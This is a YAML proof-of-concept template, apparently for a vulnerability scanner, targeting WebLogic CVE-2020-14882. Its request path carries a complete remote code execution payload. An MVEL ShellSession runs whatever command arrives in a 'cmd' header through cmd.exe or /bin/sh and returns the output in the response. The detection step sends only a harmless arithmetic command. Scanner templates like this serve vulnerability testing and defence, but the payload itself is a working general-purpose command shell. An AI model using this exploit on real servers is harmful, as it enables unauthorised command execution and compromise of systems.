name: poc-yaml-weblogic-cve-2020-14882
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
rules:
  - method: GET
    path: >-
      /console/css/../consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread
      currentThread = (weblogic.work.ExecuteThread)Thread.currentThread();
      weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork();
      java.lang.reflect.Field field =
      adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object
      obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req
      =
      (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj);
      String cmd = req.getHeader("cmd");String[] cmds =
      System.getProperty("os.name").toLowerCase().contains("window") ? new
      String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd
      != null ){ String result = new java.util.Scanner(new
      java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next();
      weblogic.servlet.internal.ServletResponseImpl res =
      (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new
      weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}
      currentThread.interrupt();')
    headers:
      cmd: '/bin/bash -c ''expr {{r1}} + {{r2}}'''
    expression: |
      response.body.bcontains(bytes(string(r1 + r2)))
detail:
    author: godamos
    links:
      - https://github.com/jas502n/CVE-2020-14882
    
